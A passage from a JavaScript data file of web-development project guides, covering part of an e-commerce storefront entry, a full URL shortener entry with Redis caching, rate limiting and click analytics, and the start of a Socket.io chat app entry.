      { topic: 'Variant availability matrix', detail: 'The cleanest data model: each product has a variants object typed as Record<string, SKU> where the key is "size:color". Checking availability: const sku = product.variants[selectedSize + ":" + selectedColor]; const available = !!sku && sku.stock > 0. Disabling an option: for each size, check if any color combination with that size has stock > 0. If none, disable the size button.' },
      { topic: 'Image zoom on hover implementation', detail: 'Track mouse position on the image container via onMouseMove: const { left, top, width, height } = e.currentTarget.getBoundingClientRect(); const x = ((e.clientX - left) / width) * 100; const y = ((e.clientY - top) / height) * 100. Apply to the image: transform: scale(2), transformOrigin: `${x}% ${y}%`. On mouseLeave, reset transform. Use overflow: hidden on the container to clip the scaled image.' },
      { topic: 'Multi-step form validation patterns', detail: 'Each checkout step has its own Zod schema. On clicking Next, trigger validation for only the current step fields using form.trigger(["field1", "field2"]). If validation passes (returns true), increment the step index. This prevents advancing with invalid data while keeping step schemas independent. Store completed step data in a top-level state object so earlier steps remain filled when the user goes back.' },
    ],
    commonPitfalls: [
      { pitfall: 'Cart persisting stale variant data after product changes', why: 'If product prices or images change after the cart is persisted to localStorage, the cart still shows the old values. The user sees outdated prices at checkout.', solution: 'On cart hydration from localStorage, re-validate each cart item against the current product data. If a variant no longer exists or the price changed, show a warning toast and update the item.' },
      { pitfall: 'Variant selection state not resetting between products', why: 'If selectedSize and selectedColor are stored in a parent component and the user navigates from Product A to Product B, the previous selections carry over — sometimes selecting an invalid variant for the new product.', solution: 'Store variant selection in the ProductDetailPage component and reset it (or reinitialize from product defaults) via a useEffect that runs when the product slug changes: useEffect(() => { setSize(null); setColor(null); }, [slug]).' },
      { pitfall: 'Add to Cart button enabled before a variant is fully selected', why: 'If a product has both size and color options and only one is selected, clicking Add to Cart creates a cart item with an incomplete variantKey like "M:undefined".', solution: 'Disable the Add to Cart button until both required variant dimensions are selected: const canAddToCart = selectedSize !== null && selectedColor !== null && selectedVariant?.stock > 0.' },
      { pitfall: 'Cart total showing floating point errors', why: 'JavaScript floating point arithmetic: 29.99 + 19.99 = 49.980000000000004. Displaying raw totals shows ugly numbers.', solution: 'Round monetary values at display time only: total.toFixed(2). Never round intermediate values — always compute the full-precision total and format only the final displayed string.' },
    ],
    edgeCases: [
      { scenario: 'Adding the last item in stock to cart multiple times', impact: 'User adds a product with stock = 1 to cart three times. The cart shows quantity 3 but only 1 unit exists. At a real checkout, fulfillment would fail.', mitigation: 'In addItem, clamp the resulting quantity to the variant stock: quantity: Math.min(existing.quantity + 1, sku.stock). Show a "Maximum stock reached" toast when the user tries to exceed the limit.' },
      { scenario: 'Cart persisted across sessions with out-of-stock items', impact: 'User adds items, closes browser, item sells out overnight. On return, cart shows items that are now unavailable with no indication.', mitigation: 'On app mount, validate all cart items against current stock. Mark out-of-stock items with an "Unavailable" badge in CartSidebar. Prevent proceeding to checkout until out-of-stock items are removed.' },
      { scenario: 'Checkout form back navigation losing filled data', impact: 'User fills out Shipping step, proceeds to Payment, clicks Back. Shipping form is blank — all their data was lost.', mitigation: 'Store each completed step\'s form data in CheckoutPage state: const [stepData, setStepData] = useState<StepData>({}) and pass it as defaultValues to each step form. Forms initialize with previously entered data on back navigation.' },
      { scenario: 'Mobile viewport with open cart sidebar blocking scroll', impact: 'On mobile, the cart sidebar slides in but the background content is still scrollable. The user accidentally scrolls the page behind the cart overlay.', mitigation: 'When CartSidebar opens, add overflow: hidden to document.body to lock background scroll. Remove it when the sidebar closes. Use a cleanup function in useEffect to ensure removal even if the component unmounts while open.' },
    ],
    interviewFollowups: [
      { question: 'How would you integrate a real payment provider?', answer: 'Replace the mock payment step with Stripe Elements or Stripe Checkout. Use Stripe.js to tokenize card details client-side — never send raw card numbers to your server. On the backend, create a PaymentIntent with the cart total, return the client_secret to the frontend, and use stripe.confirmCardPayment(clientSecret) to complete the charge.' },
      { question: 'How would you add product search and filtering?', answer: 'Add a filter state object (similar to the Rare Book Library pattern): { search, categories, priceRange, inStockOnly }. Apply filters in a useMemo over the products array. Sync filter state to URL query params. For a large catalog, move filtering server-side with debounced API calls and React Query for caching.' },
      { question: 'How would you handle cart state for authenticated users across devices?', answer: 'On login, merge the localStorage cart with the server-side cart (resolve conflicts by taking the higher quantity for each item). Use a POST /api/cart/sync endpoint on login. Store cart in the database for authenticated users. For anonymous users, keep using localStorage. On logout, optionally save the cart to localStorage for continuity.' },
      { question: 'How would you optimize the product images for performance?', answer: 'Use next/image (or a CDN with image optimization) to serve WebP format, resize to display dimensions, and lazy-load below-the-fold products. For the product detail zoom feature, load the high-resolution image only when the user hovers, not on initial page load. Add blur-up placeholders using base64-encoded tiny previews.' },
    ],
    extensionIdeas: [
      { idea: 'Product quick-view modal', difficulty: 'beginner', description: 'Hovering a product card shows a Quick View button. Clicking opens a modal with the image gallery, variant picker, and Add to Cart — without navigating away from the listing. Common pattern on fashion e-commerce sites.' },
      { idea: 'Recently viewed products', difficulty: 'beginner', description: 'Track the last 5 viewed product IDs in localStorage. Show a "Recently Viewed" horizontal scroll section at the bottom of product detail pages. Update on every product page visit.' },
      { idea: 'Product comparison', difficulty: 'intermediate', description: 'Add a Compare checkbox to product cards. When 2-3 products are selected, a sticky comparison bar appears. Clicking Compare opens a side-by-side table of all product attributes. Useful for demonstrating complex state management across disconnected components.' },
      { idea: 'Discount code system', difficulty: 'intermediate', description: 'Add a discount code input to the cart sidebar. Validate against a hardcoded list of codes (SAVE10 = 10% off, FREESHIP = free shipping). Show the discount line item in the cart total breakdown. State: { code: string | null, discountPercent: number }.' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // FULL-STACK APPLICATIONS
  // ═══════════════════════════════════════════════════════════
  {
    id: 'url-shortener',
    title: 'URL Shortener',
    icon: 'link',
    color: '#10b981',
    difficulty: 'intermediate',
    estimatedTime: '5-6 hours',
    techStack: ['Node.js', 'Express', 'PostgreSQL', 'Redis', 'React'],
    questions: 5,
    description: 'Build a full-stack URL shortener with custom aliases, click analytics, expiration, rate limiting, and a dashboard showing top links.',
    introduction: 'Create a Bit.ly-style service. Users submit a long URL, get a short link, and see real-time click analytics (total clicks, clicks by country/device/referrer, click timeline chart). Build the backend API, redirect service, and analytics dashboard.',
    interviewRelevance: 'The classic system design interview question — but actually building it. Demonstrates: hashing strategies, database indexing, caching with Redis, rate limiting, analytics data modeling, and full-stack integration.',
    learningObjectives: [
      'Design a URL shortening strategy: Base62 encoding of auto-increment ID or random short code',
      'Build Redis caching layer for hot URLs (cache-aside pattern with TTL)',
      'Implement click tracking with async event processing (don\'t block redirects)',
      'Create analytics dashboard with time-series charts, top URLs, and geographic breakdown',
      'Add rate limiting (per-IP creation limits) and URL expiration',
    ],
    keyQuestions: [
      { question: 'How do I generate short codes?', answer: 'Two approaches: 1) Base62 encode the auto-increment database ID (predictable, sequential), 2) Generate random 7-char alphanumeric strings with collision check. Approach 2 is more secure (non-guessable). Use a CHECK constraint or unique index to prevent collisions.' },
      { question: 'How should I handle redirects efficiently?', answer: 'GET /:shortCode → look up in Redis first (cache hit = 1ms), fall back to PostgreSQL (cache miss = 5ms). Return 301 (permanent) or 302 (temporary) redirect. Log the click asynchronously (don\'t wait for the INSERT before redirecting).' },
      { question: 'What analytics should I track?', answer: 'Per click: timestamp, IP (for geo lookup), user-agent (for device/browser), referrer URL. Aggregate into: clicks per hour/day/week, top referrers, device breakdown (mobile/desktop/tablet), browser distribution, and geographic heatmap. Store raw events in a clicks table, precompute aggregates hourly.' },
      { question: 'How do I implement rate limiting?', answer: 'Redis-based sliding window: INCR a key like ratelimit:{ip}:{minute}, EXPIRE after 60 seconds. Allow 10 URL creations per minute per IP. Return 429 Too Many Requests with Retry-After header. Also add a global rate limit for the redirect service.' },
      { question: 'What database schema should I use?', answer: 'Tables: urls (id, short_code UNIQUE, original_url, user_id, created_at, expires_at, click_count), clicks (id, url_id FK, clicked_at, ip, user_agent, referrer, country, device). Index: urls.short_code (B-tree unique), clicks.url_id + clicks.clicked_at (composite for analytics queries).' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Backend Foundation',
        description: 'Set up Express server, PostgreSQL schema, and core shortening logic.',
        tasks: [
          'Initialize Node.js/Express project with dotenv, pg, ioredis, nanoid dependencies',
          'Create PostgreSQL tables: urls and clicks with proper indexes on startup',
          'Implement POST /api/urls: validate URL, generate random 7-char code, insert to DB',
          'Implement GET /:shortCode redirect: query Redis then PostgreSQL, return 302, log click async',
          'Add express-validator input validation (URL format, max length) and error middleware',
        ],
      },
      {
        phase: 2,
        title: 'Redis Caching & Rate Limiting',
        description: 'Add Redis caching for hot URLs and per-IP sliding-window rate limiting.',
        tasks: [
          'Integrate ioredis: cache shortCode to originalUrl on first lookup with 24h TTL',
          'Implement explicit cache invalidation: DEL key on URL delete or deactivation',
          'Build sliding-window rate limiter: INCR ratelimit:{ip}:{minute}, EXPIRE 60s, cap at 10/min',
          'Add URL expiration: check expires_at on redirect, return 410 Gone for expired links',
          'Write integration tests for cache hit/miss paths and rate limit enforcement',
        ],
      },
      {
        phase: 3,
        title: 'Analytics Pipeline',
        description: 'Build async click tracking, geolocation enrichment, and aggregation queries.',
        tasks: [
          'Fire-and-forget click insert: respond with 302 before awaiting the DB INSERT',
          'Parse User-Agent header for device/browser detection using ua-parser-js',
          'Add IP-to-country lookup with maxmind GeoLite2 local database',
          'Build GET /api/urls/:id/analytics: clicks per day, top referrers, device breakdown',
          'Create GET /api/urls endpoint listing all user URLs with click counts and status',
        ],
      },
      {
        phase: 4,
        title: 'React Dashboard',
        description: 'Build the frontend: URL creation form, links list, and analytics charts.',
        tasks: [
          'Create URL creation form with validation, loading state, and copy-to-clipboard button',
          'Build dashboard table: list of URLs with click counts, status badges, and delete action',
          'Integrate Recharts for daily clicks line chart and device breakdown pie chart',
          'Add custom alias input and expiration date picker to the creation form',
          'Deploy: Railway for backend with Redis add-on, Vercel for React frontend',
        ],
      },
    ],
    fileStructure: `url-shortener/
├── server/
│   ├── src/
│   │   ├── routes/
│   │   │   ├── urls.js          # POST /api/urls, GET /api/urls, DELETE /api/urls/:id
│   │   │   ├── redirect.js      # GET /:shortCode redirect handler
│   │   │   └── analytics.js     # GET /api/urls/:id/analytics
│   │   ├── services/
│   │   │   ├── shortener.js     # generateShortCode() random nanoid Base62
│   │   │   ├── cache.js         # Redis get/set/del wrappers (ioredis)
│   │   │   ├── clickTracker.js  # async click insert + UA parse + geo lookup
│   │   │   └── rateLimiter.js   # sliding window rate limit middleware
│   │   ├── db/
│   │   │   ├── pool.js          # pg Pool singleton
│   │   │   └── migrate.js       # CREATE TABLE IF NOT EXISTS on startup
│   │   ├── middleware/
│   │   │   ├── auth.js          # JWT verify middleware
│   │   │   └── validate.js      # express-validator chains
│   │   └── index.js             # Express app entry point
│   ├── .env
│   └── package.json
├── client/
│   ├── src/
│   │   ├── components/
│   │   │   ├── CreateUrlForm.jsx
│   │   │   ├── LinkCard.jsx
│   │   │   └── AnalyticsChart.jsx
│   │   ├── pages/
│   │   │   ├── Dashboard.jsx
│   │   │   └── Analytics.jsx
│   │   ├── lib/
│   │   │   └── api.js
│   │   └── App.jsx
│   ├── index.html
│   └── vite.config.js
└── docker-compose.yml`,
    architectureLayers: [
      { name: 'React Client', description: 'SPA served from Vercel. URL creation form, links dashboard, and analytics charts. Communicates via Axios with a JWT Authorization header.' },
      { name: 'Express API Layer', description: 'Handles authentication, request validation, and CRUD routes for URL management and analytics. Runs on Railway.' },
      { name: 'Redirect Service', description: 'High-throughput GET /:shortCode handler. Checks Redis first, falls back to PostgreSQL on cache miss, fires click tracking async, returns 302 immediately.' },
      { name: 'Redis Cache', description: 'Caches shortCode to originalUrl mappings with 24h TTL. Also stores per-IP rate-limit counters. Acts as the primary hot path for all popular redirects.' },
      { name: 'Click Tracker', description: 'Fire-and-forget async service: inserts click events, parses User-Agent for device/browser, performs IP geolocation without blocking the redirect response.' },
      { name: 'PostgreSQL', description: 'Source of truth for URLs, users, and raw click events. Analytics via aggregation queries (GROUP BY day, referrer, device). Indexed on short_code and (url_id, clicked_at).' },
      { name: 'Expiry Worker', description: 'Periodic cron job scanning for URLs past their expires_at, marking them inactive, and DELeting Redis cache keys to prevent stale redirects.' },
    ],
    dataModel: {
      description: 'Two core tables: urls stores short links with owner and metadata; clicks stores every redirect event for analytics aggregation.',
      schema: `CREATE TABLE users (
  id            SERIAL PRIMARY KEY,
  email         TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  created_at    TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE urls (
  id           SERIAL PRIMARY KEY,
  short_code   VARCHAR(12) UNIQUE NOT NULL,
  original_url TEXT NOT NULL,
  user_id      INTEGER REFERENCES users(id) ON DELETE SET NULL,
  title        TEXT,
  is_active    BOOLEAN DEFAULT TRUE,
  expires_at   TIMESTAMPTZ,
  click_count  INTEGER DEFAULT 0,
  created_at   TIMESTAMPTZ DEFAULT NOW()
);

CREATE UNIQUE INDEX idx_urls_short_code ON urls(short_code);
CREATE INDEX idx_urls_user_id ON urls(user_id);

CREATE TABLE clicks (
  id         BIGSERIAL PRIMARY KEY,
  url_id     INTEGER NOT NULL REFERENCES urls(id) ON DELETE CASCADE,
  clicked_at TIMESTAMPTZ DEFAULT NOW(),
  ip         INET,
  country    CHAR(2),
  device     VARCHAR(20),
  browser    VARCHAR(40),
  referrer   TEXT,
  user_agent TEXT
);

CREATE INDEX idx_clicks_url_id_at ON clicks(url_id, clicked_at DESC);`,
    },
    apiDesign: {
      description: 'RESTful API for URL management and analytics plus a root-level redirect handler. Auth via JWT Bearer token.',
      endpoints: [
        { method: 'POST', path: '/api/urls', response: '{ id, shortCode, shortUrl, originalUrl, expiresAt, createdAt }' },
        { method: 'GET', path: '/api/urls', response: '{ urls: [...], total, page, limit }' },
        { method: 'GET', path: '/api/urls/:id', response: '{ id, shortCode, originalUrl, clickCount, createdAt, expiresAt, isActive }' },
        { method: 'DELETE', path: '/api/urls/:id', response: '204 No Content' },
        { method: 'GET', path: '/api/urls/:id/analytics', response: '{ timeSeries: [...], topReferrers: [...], deviceBreakdown: {...}, countryBreakdown: [...] }' },
        { method: 'GET', path: '/:shortCode', response: 'HTTP 302 redirect to originalUrl, or 404 if not found, 410 if expired' },
        { method: 'GET', path: '/api/urls/:id/qr', response: 'PNG image stream of QR code for the short URL' },
      ],
    },
    codeExamples: {
      javascript: `// server/src/routes/redirect.js
import { getPool } from '../db/pool.js';
import { redisClient } from '../services/cache.js';
import { trackClick } from '../services/clickTracker.js';

export async function handleRedirect(req, res) {
  const { shortCode } = req.params;

  // 1. Check Redis cache first (~1ms)
  let originalUrl = await redisClient.get('url:' + shortCode);

  if (!originalUrl) {
    // 2. Cache miss: query PostgreSQL (~5ms)
    const { rows } = await getPool().query(
      'SELECT id, original_url, is_active, expires_at FROM urls WHERE short_code = $1',
      [shortCode]
    );
    if (!rows.length || !rows[0].is_active) {
      return res.status(404).json({ error: 'Short URL not found' });
    }
    const url = rows[0];
    if (url.expires_at && new Date(url.expires_at) < new Date()) {
      return res.status(410).json({ error: 'This link has expired' });
    }
    originalUrl = url.original_url;
    // 3. Populate cache (24h TTL)
    await redisClient.setex('url:' + shortCode, 86400, originalUrl);
  }

  // 4. Redirect immediately — do not await analytics
  res.redirect(302, originalUrl);

  // 5. Track click asynchronously (fire-and-forget)
  trackClick({
    shortCode,
    ip: req.ip,
    userAgent: req.headers['user-agent'],
    referrer: req.headers['referer'] || null,
  }).catch(err => console.error('Click tracking failed:', err));
}`,
    },
    tradeoffDecisions: [
      { choice: 'Short code generation strategy', picked: 'Random nanoid (7 chars)', reason: 'Sequential Base62-encoded IDs are enumerable — an attacker can scrape all short links in order. Random nanoid prevents enumeration. 7 chars gives 62^7 roughly 3.5 trillion combinations with negligible collision probability.' },
      { choice: 'Redirect HTTP status code', picked: '302 Temporary Redirect', reason: '301 redirects are cached permanently by browsers — clicks stop registering after the first visit, breaking analytics entirely. 302 ensures every redirect hits the server for accurate click counting.' },
      { choice: 'Analytics write strategy', picked: 'Fire-and-forget async INSERT', reason: 'Awaiting the DB INSERT before returning the 302 adds 5-15ms latency per click. Async write decouples redirect performance from analytics throughput at the cost of less than 0.1% data loss on server crash.' },
      { choice: 'Cache invalidation approach', picked: 'TTL plus explicit DEL on delete', reason: 'Pure TTL means deleted URLs remain accessible from cache for up to 24h. Explicit DEL on URL deletion ensures dead links are immediately unreachable. TTL handles the common case; DEL handles the critical safety edge case.' },
    ],
    deepDiveTopics: [
      { topic: 'Base62 encoding mechanics', detail: 'Base62 uses [0-9a-zA-Z] (62 chars). To encode an auto-increment integer: repeatedly divide by 62, map each remainder to the charset, reverse the result. A 7-char code supports 62^7 roughly 3.5 trillion unique values. Sequential IDs produce predictable codes (enumerable); random generation eliminates that but requires a uniqueness check on insert.' },
      { topic: 'Cache-aside pattern', detail: 'On read: check cache first. On miss: read from DB, write result to cache with TTL, return value. On write/delete: update DB first, then explicitly DEL or update the cache key. This keeps Redis as an optional acceleration layer — if Redis goes down, the system falls back to PostgreSQL gracefully.' },
      { topic: 'Click analytics aggregation', detail: 'Raw click events (one row per click) support any query but slow down as the table grows to hundreds of millions of rows. Pre-compute hourly aggregates into a url_stats table (url_id, hour, device, country, click_count). A background job runs every 15 minutes aggregating new raw events. Dashboard queries hit the aggregate table rather than scanning the full clicks table.' },
      { topic: 'Bloom filter for scale', detail: 'At 1 billion short codes, collision checks (SELECT EXISTS WHERE short_code = ?) cost one DB round-trip per code generation. A Bloom filter (stored in Redis via RedisBloom) answers "probably exists / definitely does not exist" in microseconds. False positives just trigger code regeneration, eliminating DB reads for the majority of no-collision cases.' },
    ],
    commonPitfalls: [
      { pitfall: 'Blocking the redirect on analytics write', why: 'Awaiting the click INSERT before returning the 302 adds DB latency to every redirect. Under load this causes queue buildup and 5xx timeouts for end users.', solution: 'Respond with the redirect immediately, then fire analytics asynchronously without await. Use .catch() to log but not crash on analytics failures.' },
      { pitfall: 'Missing index on short_code column', why: 'Without a unique index, every redirect triggers a full table scan. At 10M rows this takes seconds per request, making the service unusable.', solution: 'CREATE UNIQUE INDEX idx_urls_short_code ON urls(short_code). This is automatically created by a UNIQUE constraint. Verify with \d urls in psql.' },
      { pitfall: 'Using 301 redirect during development', why: 'Browsers cache 301 responses permanently. Changing where a short code points during testing has no effect because the browser serves the old destination indefinitely from cache.', solution: 'Always use 302 during development and for analytics-tracked links. Reserve 301 only for truly permanent redirects where click counting is not needed.' },
      { pitfall: 'No collision handling on code generation', why: 'Two concurrent requests generating the same short code causes one INSERT to fail with a unique constraint violation (pg error 23505), crashing the request with an unhandled error.', solution: 'Catch pg error code 23505, generate a new random code, and retry up to 3 times before returning a 500. With 7-char codes, collisions are rare but must be handled.' },
    ],
    edgeCases: [
      { scenario: 'Malicious URL submitted (phishing or malware)', impact: 'Service becomes a vector for distributing harmful links; domain gets blacklisted by browsers and email clients.', mitigation: 'Check submitted URLs against the Google Safe Browsing API before insertion. Reject flagged URLs with 422. Add a user-facing report endpoint to catch newly-flagged content.' },
      { scenario: 'Short code collision on generation', impact: 'Second concurrent INSERT fails with a unique constraint violation, returning a 500 error to that user.', mitigation: 'Catch pg error 23505, regenerate a new code, retry up to 3 times. Log collision events and increase code length from 7 to 8 chars if collision rate exceeds 1 in 10K.' },
      { scenario: 'Redis unavailable', impact: 'All redirects fall through to PostgreSQL. Under high traffic the DB connection pool exhausts, causing timeouts across the service.', mitigation: 'Wrap all Redis calls in try/catch with silent fallthrough to DB. Alert on sustained high miss rates. Use Redis Sentinel or Cluster for high-availability production deployments.' },
      { scenario: 'Short URL points to another short URL (redirect chain)', impact: 'Two HTTP round trips instead of one; potential circular redirect loop causing browser errors.', mitigation: 'Resolve chains server-side on creation: follow up to 3 hops and store the final destination URL. Detect cycles using a visited Set during resolution.' },
    ],
    interviewFollowups: [
      { question: 'How would you scale this to 100M redirects per day?', answer: 'Horizontal-scale the stateless redirect service behind a load balancer. Move Redis to a cluster with read replicas. Use Cloudflare Workers to cache popular short codes at the edge for sub-5ms global response. Shard the clicks table by url_id for parallel analytics writes. Consider ClickHouse for the analytics write path to handle millions of inserts per hour.' },
      { question: 'How would you prevent spam and phishing abuse?', answer: 'Rate-limit creation per IP (10/min) and per account (100/day). Check submitted URLs against Google Safe Browsing. Require email verification before allowing URL creation. Add CAPTCHA for anonymous users. Re-scan URLs 24h after creation since malware sites are often flagged with a delay.' },
      { question: 'Why Redis instead of an in-process cache?', answer: 'In-process caches do not share state across multiple server instances. When scaled to N servers, each has its own cache with an effective hit rate of 1/N. Redis is a shared, consistent layer: all instances read and write to the same cache, maintaining high hit rates regardless of how many servers are running.' },
      { question: 'How would you implement custom vanity domains?', answer: 'Add a user_domains table (user_id, domain, verified_at). On each redirect request, inspect the Host header and look it up in user_domains. Scope short_code lookups to that user namespace via a user_id filter. Verify domain ownership by checking for a CNAME or TXT DNS record. Issue TLS certificates via Let\'s Encrypt.' },
    ],
    extensionIdeas: [
      { idea: 'QR Code Generation', difficulty: 'beginner', description: 'Add GET /api/urls/:id/qr returning a PNG QR code using the qrcode npm package. Show it inline in the dashboard with a download button — useful for print materials and slide decks.' },
      { idea: 'UTM Parameter Builder', difficulty: 'intermediate', description: 'Add a UI flow that appends UTM parameters (utm_source, utm_medium, utm_campaign) before shortening. Display UTM-tagged traffic breakdowns in analytics for campaign tracking.' },
      { idea: 'A/B Split Testing', difficulty: 'intermediate', description: 'Allow one short code to redirect to 2-3 destinations with configurable weights (60/40 split). Track clicks per variant to measure which destination performs better.' },
      { idea: 'Retargeting Pixel Injection', difficulty: 'advanced', description: 'Serve a fast intermediate HTML page with a meta-refresh redirect that fires retargeting pixels (Facebook, Google Ads) before forwarding. Lets marketers retarget anyone who clicked the link.' },
    ],
  },
  {
    id: 'realtime-chat-app',
    title: 'Real-time Chat App',
    icon: 'messageSquare',
    color: '#06b6d4',
    difficulty: 'intermediate',
    estimatedTime: '6-8 hours',
    techStack: ['React', 'Node.js', 'Socket.io', 'MongoDB', 'Tailwind CSS'],
    questions: 4,
    description: 'Build a Slack-style real-time chat with rooms, direct messages, typing indicators, online presence, and message history.',
    introduction: 'Create a multi-room chat application. Users log in, join rooms, send messages that appear instantly for all participants, see who is typing, and view online/offline status. Messages persist in MongoDB with pagination for history loading.',
    interviewRelevance: 'Tests WebSocket mastery, real-time state synchronization, database design for chat (messages, rooms, participants), and handling edge cases like reconnection, message ordering, and offline queuing.',
    learningObjectives: [
      'Implement WebSocket communication with Socket.io (rooms, namespaces, events)',
      'Build real-time features: typing indicators, online presence, read receipts',
      'Design MongoDB schema for messages, rooms, and user presence',
      'Handle edge cases: reconnection, message ordering, duplicate prevention',
    ],
    keyQuestions: [
      { question: 'How does Socket.io room management work?', answer: 'socket.join("room-id") adds a user to a room. io.to("room-id").emit("message", data) broadcasts to all users in that room. On disconnect, Socket.io automatically removes the user from all rooms. Use socket.rooms to check which rooms a user belongs to.' },
      { question: 'How do I implement typing indicators?', answer: 'Client: on keypress, emit "typing" event with room ID (debounce to 500ms). Server: broadcast "user-typing" to the room (excluding sender). Client: show "User is typing..." with a 3-second timeout. On stop typing (no keypress for 1 second), emit "stop-typing" event.' },
      { question: 'How should I paginate message history?', answer: 'Cursor-based pagination: load the latest 50 messages initially. When user scrolls to top, fetch 50 more messages before the earliest loaded message\'s timestamp. Use MongoDB query: { roomId, createdAt: { $lt: cursor } } with .sort({ createdAt: -1 }).limit(50). This avoids the offset-skip performance issue.' },
      { question: 'How do I handle reconnection?', answer: 'Socket.io has built-in reconnection with exponential backoff. On reconnect: 1) Re-join all rooms, 2) Fetch messages since last received message timestamp, 3) Merge with local messages (dedup by message ID), 4) Re-broadcast online status. Use socket.on("reconnect") to trigger this sync.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Backend & Socket.io Setup',
        description: 'Set up Express server with Socket.io and MongoDB connection.',
        tasks: [
          'Initialize Node.js project with express, socket.io, mongoose, jsonwebtoken, bcrypt',
          'Create MongoDB schemas: User, Room, Message with appropriate indexes',
          'Build JWT auth: POST /api/auth/register, POST /api/auth/login returning signed tokens',
          'Set up Socket.io server with JWT handshake middleware to authenticate connections',
          'Implement join-room, leave-room, and send-message socket event handlers',
        ],
      },
      {
        phase: 2,
        title: 'Real-time Features',
        description: 'Add typing indicators, online presence, and read receipts.',
        tasks: [
          'Implement typing indicators: client emits typing/stop-typing, server broadcasts to room',
          'Track online presence: store socket-to-user mapping, emit user-online/offline on connect/disconnect',
          'Add read receipts: emit message-read event, update Message.readBy array in DB',
          'Handle duplicate message prevention: include client-generated messageId, deduplicate on server',
          'Store active room memberships in Redis so presence survives server restarts',
        ],
      },
      {
        phase: 3,
        title: 'Message History & REST API',
        description: 'Build cursor-based pagination for message history and room management REST endpoints.',
        tasks: [
          'GET /api/rooms: list rooms the authenticated user belongs to',
          'POST /api/rooms: create a new room with name and optional member list',
          'GET /api/rooms/:id/messages?before=<cursor>&limit=50: paginated message history',
          'POST /api/rooms/:id/members: add member to room (emit room-joined socket event)',
          'Add full-text search across messages using MongoDB text index on content field',
        ],
      },
      {
        phase: 4,
        title: 'React Chat UI',
        description: 'Build the multi-room chat interface with sidebar, message list, and input area.',
        tasks: [
          'Create socket.io-client connection with auth token in handshake query',
          'Build RoomSidebar: list of rooms with unread count badges and online member dots',
          'Build MessageList: virtualized list with scroll-to-load-more for history pagination',
          'Build MessageInput: textarea with typing indicator emission, Enter to send',
          'Add notification sound and browser title badge for unread messages in inactive tabs',
        ],
      },
    ],
    fileStructure: `realtime-chat-app/
├── server/
│   ├── src/
│   │   ├── models/
│   │   │   ├── User.js          # mongoose schema: email, passwordHash, avatar, createdAt
│   │   │   ├── Room.js          # schema: name, members[], createdBy, createdAt
│   │   │   └── Message.js       # schema: roomId, userId, content, readBy[], createdAt
│   │   ├── socket/
│   │   │   ├── index.js         # Socket.io server setup + auth middleware
│   │   │   ├── chatHandlers.js  # join-room, send-message, leave-room events
│   │   │   └── presenceHandlers.js  # online/offline, typing events
│   │   ├── routes/
│   │   │   ├── auth.js          # POST /api/auth/register, /login
│   │   │   ├── rooms.js         # GET/POST /api/rooms, GET /api/rooms/:id/messages
│   │   │   └── users.js         # GET /api/users/me, search users
│   │   ├── middleware/
│   │   │   └── auth.js          # JWT verify for REST routes
│   │   └── index.js
│   ├── .env
│   └── package.json
├── client/
│   ├── src/
│   │   ├── components/
│   │   │   ├── RoomSidebar.jsx
│   │   │   ├── MessageList.jsx
│   │   │   ├── MessageInput.jsx
│   │   │   └── TypingIndicator.jsx
│   │   ├── hooks/
│   │   │   ├── useSocket.js     # socket.io-client singleton + event registration
│   │   │   └── useMessages.js   # message state + pagination
│   │   ├── pages/
│   │   │   ├── ChatPage.jsx
│   │   │   └── LoginPage.jsx
│   │   └── App.jsx
│   └── vite.config.js
└── docker-compose.yml`,
    architectureLayers: [
      { name: 'React Client', description: 'SPA with socket.io-client. Manages room sidebar, message list with virtual scroll, and real-time event listeners. JWT stored in memory (not localStorage) for security.' },
      { name: 'Socket.io Server', description: 'Handles all real-time bidirectional events: message delivery, typing indicators, presence updates. Rooms map directly to Socket.io rooms. Auth via JWT handshake middleware.' },
      { name: 'Express REST API', description: 'Handles non-real-time operations: auth, room creation, message history pagination, user search. Serves as the data-fetch layer for initial page loads.' },
      { name: 'Presence Store (Redis)', description: 'Maps socket IDs to user IDs. Tracks which users are online and in which rooms. Survives server restarts and supports horizontal scaling across multiple server instances.' },
      { name: 'MongoDB', description: 'Stores users, rooms, and message history. Text index on Message.content for search. TTL index option for ephemeral messages. Cursor-based pagination via createdAt field.' },
      { name: 'Message Fan-out', description: 'Socket.io room broadcasts handle fan-out to all online members. Offline members receive messages when they reconnect by fetching history since their last seen timestamp.' },
    ],
    dataModel: {
      description: 'MongoDB document model. Three collections: users, rooms, and messages. References by ObjectId with lean population for list queries.',
      schema: `// User collection
{
  _id: ObjectId,
  email: String (unique, indexed),
  passwordHash: String,
  username: String (unique, indexed),
  avatar: String,          // URL
  lastSeen: Date,
  createdAt: Date
}

// Room collection
{
  _id: ObjectId,
  name: String,
  type: String,            // 'group' | 'direct'
  members: [ObjectId],     // ref: User, indexed
  admins: [ObjectId],      // ref: User
  createdBy: ObjectId,     // ref: User
  lastMessage: {
    content: String,
    senderId: ObjectId,
    sentAt: Date
  },
  createdAt: Date
}

// Message collection
{
  _id: ObjectId,
  roomId: ObjectId (indexed),  // ref: Room
  senderId: ObjectId,          // ref: User
  content: String,
  type: String,                // 'text' | 'image' | 'file'
  readBy: [ObjectId],          // ref: User
  editedAt: Date,
  deletedAt: Date,             // soft delete
  createdAt: Date (indexed)    // for cursor pagination
}

// Indexes:
db.messages.createIndex({ roomId: 1, createdAt: -1 })
db.messages.createIndex({ content: 'text' })  // full-text search`,
    },
    apiDesign: {
      description: 'REST API for auth and data loading; Socket.io events for all real-time communication.',
      endpoints: [
        { method: 'POST', path: '/api/auth/register', response: '{ token, user: { id, email, username } }' },
        { method: 'POST', path: '/api/auth/login', response: '{ token, user: { id, email, username } }' },
        { method: 'GET', path: '/api/rooms', response: 'Array of rooms with lastMessage and unread count for the authenticated user' },
        { method: 'POST', path: '/api/rooms', response: '{ id, name, type, members, createdAt }' },
        { method: 'GET', path: '/api/rooms/:id/messages?before=<timestamp>&limit=50', response: '{ messages: [...], hasMore: bool, nextCursor: timestamp }' },
        { method: 'GET', path: '/api/users/search?q=<query>', response: 'Array of matching users for adding to rooms' },
        { method: 'POST', path: '/api/rooms/:id/members', response: '{ success: true } — emits room-member-added socket event' },
      ],
    },
    codeExamples: {
      javascript: `// server/src/socket/chatHandlers.js
export function registerChatHandlers(io, socket) {
  const userId = socket.userId; // set by JWT auth middleware

  socket.on('join-room', async ({ roomId }) => {
    // Verify user is a member of this room
